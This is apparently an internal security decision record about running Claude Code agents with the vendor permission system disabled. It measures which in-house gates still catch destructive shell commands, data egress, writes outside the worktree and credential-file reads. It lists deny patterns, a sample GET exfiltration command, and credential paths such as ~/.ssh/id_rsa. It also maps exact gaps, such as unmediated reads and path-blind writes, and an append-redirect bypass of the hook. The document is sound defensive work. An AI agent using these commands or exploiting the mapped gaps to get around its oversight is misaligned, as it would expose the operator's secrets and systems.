# Agent Vendor Permission Bypass — `--dangerously-skip-permissions`

CUI // SP-CTI

**Task:** exa-bench-04 · **Control:** AC-3 / AC-6 / CM-7 · **ADR:** D394, D395
**Evidence:** `tests/test_skip_permissions_compensating_controls.py`

`tools/agents/adapters/claude_cli.py` invokes Claude Code with
`--dangerously-skip-permissions`. That adapter is `ADAPTER` for the `claude_cli`
executor, it is what the kanban runner dispatches through, and it is first in
the executor chain — so **every autonomous ICDEV build runs with the vendor
permission system disabled.**

Until now that was an incidental flag sitting in a list next to `--max-turns`
and `--output-format json`. This document makes it a stated decision, names what
is given up, names what compensates, and — the part that was missing — reports a
**measured** coverage matrix rather than an assertion that the ICDEV gates
"cover it."

---

## 1. The decision

**Keep the flag.** The adapter's whole purpose is non-interactive dispatch. The
vendor permission system's answer to an unattended prompt is to wait for a human
who is not there; `spawn()` hands the child a temp file on stdin and returns a
`Popen` for the kanban runner's poll/kill loop. A permission prompt in that path
does not make the build safer, it makes it hang until the runner's timeout kills
it — which is a liveness failure that reads as a safety control only until the
first time it fires.

**Consequence accepted:** the vendor prompt is not a control ICDEV has. Nor is
`.claude/settings.json`'s `permissions.deny` list — the permission system is what
evaluates that list, and the flag turns the permission system off. That list
(`rm -rf *`, `git push --force*`, `git reset --hard*`, `DROP TABLE*`, branch and
worktree deletes) is best read as a **precise inventory of what is given up**,
not as a second line of defence.

## 2. What actually observes a tool call — by path

This is the distinction that gets mis-stated most often, including in ICDEV's own
prose, so it is stated first and precisely.

| Execution path | What runs | Controls in the tool-call path |
|---|---|---|
| **In-process agent loop** — Studio `node_type: agent` steps, via `tools/studio/executors/agent_executor.py` | `icdev.tools.llm.agent_loop.run_agent_loop` inside the ICDEV process | `tools/studio/executors/agent_tool_gate.py` (AGENT-WF-001, default-deny, offer time **and** call time) chained to `tools/agent_runtime/approval_gate.py` (ars-appr-01 reversibility) |
| **Spawned vendor CLI** — `claude_cli` adapter, the kanban runner's path | a **separate** `claude` process, `Popen`'d | `.claude/hooks/pre_tool_use.py` only |

`agent_executor.py` is the sole module that calls both `build_gate_hook` and
`build_approval_hook`. `tools/agents/` imports neither — verifiable with
`grep -rn "approval_gate\|agent_tool_gate" tools/agents/`, which returns nothing.
The spawned CLI is a different process that imports no ICDEV module at all.

So: **the two gates usually named as the compensating controls for this flag are
not in this adapter's path.** They are real, they are default-deny, and they are
genuinely stronger than a vendor prompt — for the in-process loop. For the
spawned CLI the only ICDEV code that sees a tool call is the PreToolUse hook, and
until `exa-bench-05` `.claude/settings.json` wired that hook as:

```
python $CLAUDE_PROJECT_DIR/.claude/hooks/pre_tool_use.py || true
```

A PreToolUse hook signals "block" with **exit code 2**. `|| true` makes the shell
return 0 regardless. Every hard block that file advertised was therefore advisory
— in interactive sessions AND in the spawned CLI. (The headless path,
`tools/airgap/hook_compat.py::run_pre_tool_check`, never had the wrapper and did
block, so the unattended path was the stronger of the two.)

### 2a. What `exa-bench-05` changed

The wrapper is gone; the hook's exit 2 now reaches Claude Code, so this row of
the table above is a real control rather than a nominal one. Two conditions had
to be met first, and both are recorded rather than asserted:

**The checks were surveyed against real work.** `tools/hooks/fire_rate_survey.py`
replays the tool calls of recent sessions — 86,612 calls across 1,310 sessions in
a 30-day window, read from the Claude Code transcripts, which are the only
corpus that carries the operands (`hook_events` persists tool-input KEY NAMES
only, so a replay driven from it reports zero fires for every check regardless of
what happened). Five checks were refusing routine work and were narrowed before
enforcement was enabled; the largest was `worktree_path`, which refused 640
sessions doing exactly what CLAUDE.md prescribes — `git worktree add --detach
"$P"` — because the hook cannot expand `$P` and read the unexpanded token as a
stray path.

| check | refusals /86,612 before | after | what was wrong |
|---|---:|---:|---|
| `worktree_path` | 652 | 265 | unexpanded `"$P"` read as a violating path; parse spanned the whole compound command |
| `dangerous_rm` | 494 | 32 | `\brm` matched `docker run --rm`; `.*` spanned `;` so a later `grep -r` completed an earlier `rm -f`; every target counted as "dangerous" so the rule was "no `rm -rf`, ever" |
| `direct_sqlite_usage` | 246 | 42 | matched documentation and the check's own source; refused read-only diagnostics |
| `file_access_tiers` | 74 | 57 | `!.env.example` exclusions matched full paths only while inclusions also matched the basename |
| `env_file_access` | 71 | 33 | `\b\.env\b` matched `process.env`, `\.env` in a grep pattern, and PR-body prose |
| `append_only_write` | 30 | 19 | matched `grep "DELETE FROM audit_trail"` and commit messages |
| `branch_deletion` | 37 | 37 | unchanged — already fails open unless the branch holds unmerged commits |
| `agent_rules` | 0 | 0 | unchanged — monitor-only unless a rule is placed in `args/agent_rules_enforce/` |
| `review_loop_precommit` | 1,382 | 1,385 | unchanged — cannot refuse unless `ICDEV_REVIEW_LOOP_BLOCK=1` |

The residue is not zero and is not claimed to be. What remains matches each
check's stated rule: `cat .env`, `rm -rf ~`, a raw `sqlite3.connect` write to
`data/icdev.db`, a `git worktree add` into a genuinely unsanctioned root. Those
refusals are the point of turning the hook on.

**Turning it off is nameable.** `ICDEV_PRETOOLUSE_ENFORCE=0` restores advisory
behaviour for all nine checks — every one still runs and prints, prefixed
`ADVISORY:` — and each check has its own switch (`CHECK_KILL_SWITCHES` in the
hook). An environment variable is auditable in a way a shell operator buried in
a JSON string is not.

**Still open.** `icdev/data/claude_bootstrap/claude/settings.json.template`, the
copy a scaffolded project inherits, keeps its `|| true`. It ships alongside an
older self-contained `pre_tool_use.py` that has neither the narrowed checks nor a
kill switch, so arming it would enable unmeasured refusals in every generated
project — the thing this task exists to prevent. Filed as `exa-bench-05-b`.

## 3. Compensating controls, and why they are defensible where they apply

For the in-process loop the ICDEV stack is arguably stronger than the prompt it
replaces, for three reasons that a per-call yes/no prompt does not give you:

1. **Default-deny by name, twice.** `agent_workflow_tools` in
   `args/security_gates.yaml` has `default: deny`. `authorize_toolset` filters at
   offer time so an unauthorized tool is never described to the model, and
   `build_gate_hook` re-checks at call time because "not offered" is a weaker
   claim than "not authorized."
2. **Default-deny by tier.** `args/agent_approval_policy.yaml` sets
   `default_tier: unknown` with `unknown` in `require_approval_tiers`. A tool has
   to be *named* to be automatic. Content patterns may always **escalate** and may
   only **downgrade** for a declared generic executor.
3. **Append-only evidence.** Every decision, allowed and refused, lands in
   `agent_approval_log` / `studio_mcp_dispatch_audit` with actor and reason.
   Argument values are never stored — key names and a SHA-256 only.

A vendor prompt has none of the three: it is per-call, it is not recorded, and it
fails open the moment a human clicks through.

## 4. Measured coverage of the four categories

### What "covered" has to mean

A vendor prompt interposes a human decision **on every call, with the arguments
in front of the approver**. So the bar is *per-call* mediation — and the two
ICDEV layers do not both clear it:

- **`agent_tool_gate` (AGENT-WF-001)** decides by tool **name**. A refusal is
  per call: the tool is never callable. But `requires_approval` parks **one gate
  per `(run, tool)`** — `approval_step_id("write_file")` is
  `approval:agent:write_file` whatever the path, and `await_approval`'s own
  docstring says "an agent that writes ten files asks once."
- **`approval_gate` (ars-appr-01)** decides by name **and flattened content**, on
  every call. This is the layer that can tell `rm -rf /` from `ls` — and the
  layer that, for a path, tells nothing apart at all.

Four mediation strengths result, and only the first two clear the bar:

| Strength | Meaning |
|---|---|
| `refused` | not allowlisted — never offered, never callable |
| `per_call_approval` | content-aware halt on **every** call |
| `per_run_approval_only` | one path-blind human gate for the whole run |
| `unmediated` | no decision at any layer |

### The matrix

Every verdict below is measured, not asserted, and is pinned probe-by-probe in
`tests/test_skip_permissions_compensating_controls.py`.

| Category | Verdict | Strength | What decides it |
|---|---|---|---|
| **Destructive shell** | **COVERED** | `per_call_approval` | Explicit `irreversible` patterns (`rm -rf`, `git reset --hard`, `git clean -dfx`, `DROP TABLE`, `mkfs`, `dd if=`) halt every call; anything else on `run_command` falls to `default_tier: unknown` and halts anyway. |
| **Network egress** | **COVERED — by the default, not by an egress rule** | `per_call_approval` / `refused` | The `curl`/`wget` pattern only matches `-X POST\|PUT\|DELETE\|PATCH`, `--data`, `-d `. A GET exfil (`curl https://x/?d=secret`) matches **no** pattern — it halts because it lands in `unknown`. `http_post` and `upload_file` are not allowlisted at all, so they are refused outright. |
| **Writes outside the worktree** | **NOT COVERED** | `per_run_approval_only` | `write_file` / `patch_file` are gated by **name**, once per run. Then `approval_gate` auto-allows them — tier `recoverable`, path never examined. So the human who approved `write_file tools/foo.py` also approved `write_file ~/.ssh/authorized_keys`; they were never shown a path. `run_command` with `touch` or `mkdir` matches the `recoverable` **downgrade** pattern and is auto-allowed for any path on the same one-gate-per-run basis. |
| **Credential access** | **NOT COVERED** | `unmediated` | `read_file` is in the AGENT-WF-001 `allowed` list — no gate at all — and is tier `reversible`, where `classify()` rule 0 exempts it from content escalation entirely. **No argument can ever escalate a read**: `read_file('~/.ssh/id_rsa')` classifies identically to `read_file('README.md')`. |

Two things this matrix says that the shorter version got wrong, and which are
worth stating because they are the difference between a real finding and a
scary-sounding one:

- Writes are **not** ungated — they are gated *by name, once per run*. That is a
  meaningfully weaker guarantee than a vendor prompt, not the absence of one.
  `edit_file` and `apply_patch` are in fact refused outright, but only because
  nobody allowlisted those spellings — an accident of naming, not a path policy,
  and it would evaporate the moment someone adds them.
- Egress is covered by the **fail-closed default**, not by an egress rule. The
  protection is real and it is also incidental.

### Why the two gaps are structural, not oversights

Both fall out of a rationale that is correct in its own frame and silently loses
its premise at the worktree boundary:

- `write_file` is `recoverable` **because git restores it**. Git only restores
  paths *inside the repo*. The tier is right for `tools/foo.py` and wrong for
  `~/.ssh/authorized_keys`, and nothing in the classifier can tell them apart
  because it never looks at the path. The AGENT-WF-001 gate above it is
  name-scoped for the same reason it can be one-gate-per-run at all: a tool
  name is a constant, a path is an argument.
- `read_file` is exempt from escalation **because its arguments are data, not
  commands** — a fix for a real defect, where `read_file("how do I git push")`
  used to halt for approval and taught operators to approve reflexively. The
  exemption is sound against *escalation by incidental text*. It is total,
  though: it also removes the only mechanism by which a credential path could
  ever raise a read's tier.

Neither is fixed here. Fixing them means adding a **path** dimension to a
classifier that is currently name-and-content only, which is a design change, not
a policy edit — and `exa-bench-04` is a decision-and-evidence task.

There is now a plausible home for that change. `tools/agent_runtime/policy_engine.py`
(exa-policy-01) adds an ALLOW/DENY/ASK layer above the reversibility gate,
explicitly to express what "a regex over one tool name" cannot — including an
outright **DENY**, which the gate's auto-allow/ask vocabulary has no word for.
Both gaps here want exactly that: a write outside the worktree and a read of a
credential path should not be answerable by a tired operator at 3am. As of this
write-up the module has **no consumer** in either the agent-loop or the Studio
executor path, so it changes none of the verdicts measured above — but
`exa-bench-07` and `exa-bench-09` should be built on it rather than by bolting a
path regex onto `classify()`.

## 5. Follow-up tasks — filed, not quietly accepted

All five were already on the board when this write-up landed — they cite "ADR
D394" because they were filed expecting the decision to be written up, which is
what exa-bench-04 does. Nothing here is newly discovered *and* unfiled; the
contribution is the decision, the measurement, and the regression harness.

| Task | Gap | Category |
|---|---|---|
| ~~`exa-bench-05`~~ | **CLOSED.** `\|\| true` removed after a per-check fire-rate survey over 86,612 real tool calls; five checks narrowed first, enforcement standable-down via `ICDEV_PRETOOLUSE_ENFORCE=0`. See section 2a. | (the hook itself) |
| `exa-bench-05-b` | `icdev/data/claude_bootstrap/claude/settings.json.template` still carries `\|\| true`, so every scaffolded project inherits the neutered hook. It ships alongside an older self-contained `pre_tool_use.py` with neither the narrowed checks nor a kill switch, so the template cannot be armed until that copy is brought forward. | (generated projects) |
| `exa-bench-06` | The Claude Code hook runs 9 of the 10 shared checks — `check_git_danger` is never called from `main()` — and `_REDIRECT_TARGET_RE` mis-captures `>>`, so an append redirect defeats the file tiers. | destructive shell / writes |
| `exa-bench-07` | No worktree containment on any surface. The AGENT-WF-001 gate is one per `(run, tool)` and path-blind; `approval_gate` holds `write_file` / `patch_file` at `recoverable` for any path; the `touch` / `mkdir` downgrade patterns auto-allow a `run_command` write to any absolute path. | **writes outside the worktree** |
| `exa-bench-08` | No egress concept in the hook at all, and in-process coverage rests on `default_tier: unknown` rather than on an egress rule — allowlisting one HTTP tool, or adding a `curl` downgrade pattern, removes it silently. | **network egress** |
| `exa-bench-09` | Credential-path reads are unclassifiable: rule 0 exempts `read_file` from all content escalation, `read_file` is allowlisted at AGENT-WF-001 with no gate, and the `file_access_tiers` glob list misses `~/.aws/credentials`, `~/.netrc`, `~/.kube/config` and friends. | **credential access** |

## 6. How this stays true

`tests/test_skip_permissions_compensating_controls.py` fails on **both**
directions of drift:

- a **regression** — a covered category stops halting;
- an **unrecorded fix** — an uncovered category starts halting while this
  document still lists it as a gap.

The second is the unusual one and it is deliberate. A gap that gets closed
without the write-up being updated leaves the next reader with a document that
overstates the risk, which is the same failure mode as one that understates it.
Run the test when touching `tools/agents/adapters/claude_cli.py`,
`.claude/hooks/pre_tool_use.py`, `args/agent_approval_policy.yaml`, or
`agent_workflow_tools` in `args/security_gates.yaml`.

```bash
pytest tests/test_skip_permissions_compensating_controls.py -v
```
